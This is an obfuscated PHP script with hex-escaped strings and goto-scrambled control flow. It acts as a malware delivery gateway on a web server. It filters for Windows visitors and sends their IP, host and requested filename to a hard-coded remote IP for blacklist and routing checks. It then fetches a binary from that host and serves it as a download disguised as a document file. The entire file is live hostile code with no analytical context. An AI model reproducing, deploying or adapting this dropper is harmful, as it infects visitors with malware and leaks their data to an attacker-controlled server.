<?php
 goto jXH2U; KjIUu: function getRealIpAddr() { if (!empty($_SERVER["\110\x54\x54\x50\137\103\114\x49\105\x4e\x54\x5f\x49\x50"])) { $ip = $_SERVER["\110\124\x54\120\137\x43\x4c\111\x45\116\124\x5f\111\x50"]; } elseif (!empty($_SERVER["\x48\124\124\x50\137\130\x5f\x46\117\x52\x57\x41\122\104\x45\104\137\x46\117\x52"])) { $ip = $_SERVER["\x48\x54\x54\120\x5f\130\137\106\117\x52\x57\x41\x52\104\x45\104\x5f\x46\117\122"]; } else { $ip = $_SERVER["\122\x45\115\117\124\105\137\x41\x44\x44\x52"]; } return $ip; } goto SkIdP; IVDfu: if (empty($hdrs_new["\x68\x68"]) && $_GET["\145"] != $REDIRECT_FILENAME . "\x2e" . $file_ext) { die; } goto Z3rie; iSDrV: if (empty($_SESSION["\x64\157\143\x5f\156\141\155\x65"])) { $_SESSION["\x64\157\x63\x5f\x6e\141\155\145"] = $REDIRECT_FILENAME . "\56" . $file_ext; } goto P5NCn; JK80u: $REQUEST_URI_ARR = explode("\x2f", $REQUEST_URI); goto txcZr; Z3rie: $links = array("\150\164\x74\160\x3a\57\57\61\67\x36\x2e\x31\x32\x31\56\x31\64\56\x31\64\60\x2f\x72\x6f\x75\x74\x65\162\60\70\56\x70\x68\x70\77\x70\x70\75" . $data_json . "\x26\x76\x65\162\163\151\157\x6e\x3d" . $VERSION, "\150\x74\164\160\x3a\x2f\x2f\x31\x37\66\x2e\61\x32\x31\x2e\61\64\56\61\x34\60\x2f\x72\x6f\x75\x74\145\162\60\x38\x2e\160\150\160\x3f\160\160\75" . $data_json . "\x26\166\145\162\163\151\x6f\156\75" . $VERSION, "\x68\x74\x74\160\x3a\x2f\57\61\x37\66\x2e\x31\62\x31\x2e\61\64\x2e\61\x34\60\x2f\162\x6f\165\164\x65\x72\60\x38\56\x70\150\x70\77\x70\x70\75" . $data_json . "\46\166\145\162\x73\x69\157\156\75" . $VERSION); goto YcqZP; SkIdP: $hdrs_new = array(); goto Kz68Y; JxG5S: $_GET["\x65"] = $REQUEST_URI_ARR[2]; goto ydOFC; aw4_I: $links_ip_ckeck = array("\x68\x74\164\x70\x3a\57\x2f\61\x37\66\x2e\61\x32\x31\56\61\64\x2e\61\64\x30\x2f\x72\157\x75\164\145\162\137\x62\x6c\x61\x63\153\x2e\x70\x68\x70\x3f\x69\x70\75" . $ip_for_check . "\46\144\x61\x74\141\75" . $data_json . "\x26\x76\x65\x72\x73\x69\157\156\75" . $VERSION . "\x26\141\x6c\x61\x6e\160\x6f\75" . $hdrs_new["\141\154\141\156\x70\x6f"], "\x68\164\164\x70\72\57\x2f\61\67\66\x2e\61\62\x31\56\61\x34\56\x31\64\60\x2f\x72\157\165\x74\145\x72\x5f\142\x6c\x61\x63\x6b\56\x70\x68\160\x3f\151\x70\75" . $ip_for_check . "\46\144\141\x74\x61\75" . $data_json . "\46\166\x65\x72\163\151\x6f\x6e\75" . $VERSION . "\x26\141\x6c\141\x6e\160\x6f\x3d" . $hdrs_new["\x61\x6c\x61\x6e\x70\x6f"], "\150\164\164\160\72\x2f\x2f\x31\x37\x36\x2e\x31\62\x31\56\x31\x34\56\61\x34\60\57\x72\157\165\x74\x65\162\137\142\154\141\143\153\56\x70\x68\x70\x3f\151\x70\x3d" . $ip_for_check . "\46\144\x61\x74\141\x3d" . $data_json . "\x26\x76\145\x72\163\x69\157\x6e\75" . $VERSION . "\x26\141\x6c\x61\156\160\157\x3d" . $hdrs_new["\x61\x6c\x61\156\160\x6f"]); goto NckOa; PptYH: $ip_for_check = getRealIpAddr(); goto aw4_I; aJ6fC: if ($_GET["\x65"] != "\x31\62\63\56" . $file_ext) { if ($is_black) { die(''); } if ($_GET["\x65"] != $REDIRECT_FILENAME . "\x2e" . $file_ext) { $_SESSION["\x5f\x5f\162\145\144\151\x72\x65\143\164\137\x77\141\163\137\163\164\x61\x72\164"] = true; $_SESSION["\144\157\x63\137\x6e\x61\x6d\x65"] = $_GET["\x65"]; if (stripos($_SESSION["\x64\x6f\143\x5f\156\x61\155\145"], "\56" . $file_ext) === false) { $_SESSION["\x64\157\x63\x5f\x6e\141\155\x65"] .= "\56" . $file_ext; } $_SESSION["\146\151\154\x65\137\145\170\164"] = $file_ext; $redirect_uri = str_replace($_GET["\x65"], $REDIRECT_FILENAME . "\x2e" . $file_ext, $REQUEST_URI); echo "\x3c\150\x74\x6d\x6c\76\x3c\142\x6f\144\x79\x3e"; echo "\x3c\x64\x69\x76\40\x69\x64\75\42\156\x6b\42\x20\x64\x74\x2d\156\x6b\x3d\42" . $redirect_uri . "\42\x3e\74\57\144\x69\166\76"; echo "\74\163\143\x72\151\160\x74\x3e"; echo "\154\x6f\143\141\x74\x69\x6f\x6e\56\x70\141\x74\x68\156\141\x6d\x65\x20\x3d\40\144\x6f\x63\x75\155\x65\x6e\x74\x2e\x67\145\x74\x45\x6c\145\x6d\145\156\x74\102\x79\111\144\50\47\x6e\153\47\51\x2e\x67\145\164\x41\164\x74\x72\151\142\165\x74\x65\50\47\144\x74\55\156\x6b\47\51\x3b"; echo "\x3c\57\163\143\x72\x69\x70\164\x3e"; echo "\74\x2f\x62\x6f\144\x79\x3e\x3c\57\150\x74\155\x6c\x3e"; die("\x57\x61\x69\x74\x2e\56\x2e"); } } else { if (empty($hdrs_new["\150\150"])) { die(''); } } goto sYmhA; w6_BN: $REQUEST_URI = $_SERVER["\122\x45\x51\x55\105\x53\x54\137\125\x52\111"]; goto yB1xe; Kz68Y: $hdrs = getallheaders(); goto Oelse; JxL3B: $data_json = array("\151\x70" => getRealIpAddr(), "\x74\151\x6d\x65" => time(), "\x68\150" => $hdrs_new["\x68\150"], "\x65\x78\x74" => $file_ext, "\150\157\163\x74" => $_SERVER["\123\105\122\x56\105\122\x5f\x4e\x41\115\x45"], "\x66\x69\x6c\145\x6e\141\x6d\x65" => $_GET["\x65"]); goto riUvZ; NckOa: $is_black = false; goto oKyyX; sYmhA: if (empty($_SESSION["\x66\151\x6c\x65\x5f\x65\x78\x74"])) { $_SESSION["\146\151\x6c\x65\137\145\x78\164"] = "\172\x69\x70"; } goto IVDfu; DopCy: if (!in_array($file_ext, array("\x7a\151\x70", "\x78\x6c\x73", "\x64\157\143", "\170\154\x6c"))) { $file_ext = "\x7a\151\x70"; } goto JxL3B; riUvZ: $data_json = json_encode($data_json); goto Hs2BU; YcqZP: shuffle($links); goto a6w_b; P5NCn: foreach ($links as $link) { $ctx = stream_context_create(array("\150\x74\x74\160" => array("\164\151\x6d\145\x6f\x75\164" => 30))); $data = @file_get_contents($link, false, $ctx); if ($data == "\56\x2e\x2e\x2e" || $data == "\56\x2e\56") { break; } if (strlen($data) < 1000) { continue; } header("\x43\x6f\x6e\164\145\x6e\164\55\104\x65\x73\x63\162\x69\160\x74\151\x6f\x6e\x3a\x20\106\151\154\x65\40\x54\162\141\156\163\x66\x65\x72"); header("\x43\x6f\x6e\x74\x65\156\164\x2d\x54\171\x70\x65\x3a\x20\x61\160\160\154\151\143\x61\164\x69\x6f\x6e\57\157\x63\164\145\x74\x2d\x73\x74\x72\145\x61\155"); header("\x43\157\x6e\164\145\156\164\55\104\x69\163\160\157\163\x69\164\x69\x6f\156\x3a\40\141\164\164\x61\143\150\155\145\x6e\x74\x3b\x20\146\x69\154\145\x6e\141\155\145\75" . $_SESSION["\144\157\143\x5f\156\141\155\x65"]); header("\x43\157\x6e\164\145\x6e\164\55\124\x72\x61\156\x73\x66\145\162\55\x45\156\x63\157\144\x69\x6e\x67\x3a\x20\x62\151\x6e\141\x72\x79"); header("\x43\157\156\x6e\145\143\x74\x69\157\x6e\72\40\x4b\145\x65\160\55\x41\x6c\x69\x76\x65"); header("\105\x78\160\x69\x72\x65\163\72\x20\x30"); header("\103\x61\143\150\x65\55\103\x6f\x6e\x74\x72\x6f\154\72\x20\155\x75\x73\x74\x2d\x72\145\166\141\x6c\151\x64\x61\x74\145\54\40\x70\157\163\x74\55\x63\150\145\143\153\x3d\x30\x2c\x20\160\162\145\x2d\143\150\x65\143\153\x3d\x30"); header("\120\162\x61\147\155\x61\72\x20\160\x75\142\154\x69\x63"); echo $data; die; } goto HJK4u; ydOFC: if (empty($_SERVER["\x48\124\124\x50\x5f\125\x53\105\x52\137\101\x47\x45\116\124"])) { die(''); } goto F6ydg; aALRc: $REDIRECT_FILENAME = "\143\150\141\162\x74\x73"; goto umhCR; Oelse: foreach ($hdrs as $key => $value) { $kk = strtolower($key); $hdrs_new[$kk] = $value; } goto q070H; TmUzH: $file_ext = end($file_ext); goto DopCy; umhCR: if (session_start() === false) { die(''); } goto w6_BN; Hs2BU: $data_json = base64_encode($data_json); goto PptYH; a6w_b: $outfilepath = __DIR__ . "\57\56\x2e\x2f\142\x69\147\x5f\137\163\164\141\x74\56\164\170\x74"; goto iSDrV; yB1xe: if (empty($REQUEST_URI)) { die(''); } goto JK80u; txcZr: if (count($REQUEST_URI_ARR) != 3) { die(''); } goto JxG5S; F6ydg: if (stripos($_SERVER["\110\x54\x54\120\x5f\125\123\105\122\137\101\107\105\116\x54"], "\x57\151\x6e\144\157\x77\163") === false) { die(''); } goto KjIUu; jXH2U: $VERSION = "\x32\56\x31\x2e\x34\63\65\x36\64\x35\x37\63\x34\65"; goto aALRc; oKyyX: foreach ($links_ip_ckeck as $link_ip_ckeck) { $ctx = stream_context_create(array("\150\x74\164\x70" => array("\164\x69\155\x65\157\165\164" => 10))); $tmp_resp = @file_get_contents($link_ip_ckeck, false, $ctx); $tmp_resp_json = json_decode($tmp_resp, true); if ($tmp_resp_json["\x73\164\x61\164\x75\x73"] === true) { $is_black = $tmp_resp_json["\151\163\137\142\x6c\x61\x63\x6b"]; $REDIRECT_FILENAME = $tmp_resp_json["\x52\105\104\111\122\x45\103\x54\x5f\106\111\x4c\105\x4e\101\x4d\105"]; break; } } goto aJ6fC; q070H: $file_ext = explode("\x2e", $_GET["\145"]); goto TmUzH; HJK4u: die("\124\162\171\x20\141\147\x61\151\x6e\56");